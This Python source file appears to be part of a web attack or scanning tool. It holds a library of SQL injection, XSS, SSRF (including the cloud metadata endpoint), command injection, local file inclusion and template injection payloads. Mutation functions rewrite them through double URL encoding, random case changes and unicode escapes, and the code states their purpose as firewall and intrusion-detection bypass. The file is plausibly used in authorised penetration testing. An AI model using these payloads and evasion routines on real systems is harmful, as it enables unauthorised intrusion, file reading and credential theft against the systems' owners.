import urllib.parse
import base64
import random
import string
from typing import List, Dict, Set
import functools

class PayloadIntelligence:
    """
    Optimized Payload Management System.
    Features: Context-aware mutation, intelligent caching, and WAF evasion.
    """
    def __init__(self):
        self.library = {
            "sqli": ["' OR '1'='1", "' UNION SELECT NULL--", "admin' --"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
            "ssrf": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"],
            "cmd_injection": ["; id", "| id", "`id`"],
            "lfi": ["/etc/passwd", "../../../etc/passwd"],
            "ssti": ["{{7*7}}", "${7*7}"]
        }
        # LRU-style cache for mutated payloads to save CPU cycles
        self._mutation_cache: Dict[str, List[str]] = {}

    def get_payloads(self, category: str, mutate: bool = True, context: str = "query") -> List[str]:
        """Retrieves and optionally mutates payloads based on the input context."""
        base_payloads = self.library.get(category, [])
        if not mutate:
            return base_payloads
            
        results: Set[str] = set()
        for p in base_payloads:
            # Check cache first
            cache_key = f"{p}_{context}"
            if cache_key in self._mutation_cache:
                results.update(self._mutation_cache[cache_key])
                continue

            # Apply smart mutations based on source context
            mutated = self.mutate(p, context)
            self._mutation_cache[cache_key] = mutated
            results.update(mutated)
            
        return list(results)

    def mutate(self, payload: str, context: str = "query") -> List[str]:
        """Strategic mutation logic for WAF/IPS bypass."""
        mutated = [payload]
        
        # 1. Encoding (All contexts)
        mutated.append(urllib.parse.quote(payload))
        
        # 2. Context-Specific Mutations
        if context in ["query", "post"]:
            mutated.append(self._double_url_encode(payload))
        
        if context == "json":
            mutated.append(payload.replace('"', '\\"'))
            
        # 3. Evasion Strategies (Randomized)
        if random.random() > 0.5:
            mutated.append(self._case_mutation(payload))
        
        # Unicode and comment injection for bypass
        mutated.append(self._unicode_mutation(payload))
        
        return list(set(mutated))

    def _double_url_encode(self, p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p))

    def _case_mutation(self, p: str) -> str:
        # Optimized case mutation using list comprehension
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in p)

    def _unicode_mutation(self, p: str) -> str:
        mapping = {'/': '%u002f', '.': '%u002e', '<': '%u003c', '>': '%u003e', "'": "%u0027"}
        for k, v in mapping.items():
            p = p.replace(k, v)
        return p
